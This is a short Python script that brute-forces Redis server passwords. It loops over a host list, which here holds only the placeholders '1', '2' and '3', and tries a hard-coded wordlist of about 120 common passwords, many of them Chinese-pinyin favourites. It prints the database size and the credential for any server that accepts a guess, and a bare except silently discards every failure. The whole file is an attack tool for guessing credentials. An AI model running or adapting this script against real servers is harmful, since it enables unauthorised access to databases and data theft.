import redis
for ip in ["1","2","3"]:
    print(ip)
    for pa in ["123456","","password","passwd","12345678","admin","123",'12345','123456a','5201314','111111','woaini1314','qq123456','123123','0','1qaz2wsx','1q2w3e4r','qwe123','7758521','123qwe','a123123','123456aa','woaini520','woaini','100200','1314520','woaini123','123321','q123456','123456789','123456789a','5211314','asd123','a123456789','z123456','asd123456','a5201314','aa123456','zhang123','88888888','aptx4869','123123a','1q2w3e4r5t','1qazxsw2','5201314a','1q2w3e','aini1314','31415926','q1w2e3r4','123456qq','woaini521','1234qwer','a111111','520520','iloveyou','abc123','110110','111111a','123456abc','w123456','7758258','123qweasd','159753','qwer1234','a000000','qq123123','zxc123','123654','abc123456','123456q','qq5201314','1234567','000000a','456852','as123456','1314521','112233','521521','qazwsx123','zxc123456','abcd1234','asdasd','666666','love1314','QAZ123','aaa123','q1w2e3','aaaaaa','a123321','123000','11111111','12qwaszx','5845201314','s123456','nihao123','caonima123','zxcvbnm123','wang123','159357','1A2B3C4D','asdasd123','584520','753951','147258','1123581321','110120','qq1314520','123','1234','1234567890','0123456789','redis']:
        try:
            i=ip.split(",")
            # print(i)
            ii=i[0]
            port=i[1]
            # port=i[2]
            r = redis.Redis(host=ii, port=port, password=pa, db=0)
            if pa=="":
                pa="无口令"
            print(r.dbsize(),ii,port,pa)
            break
        except:
            pass
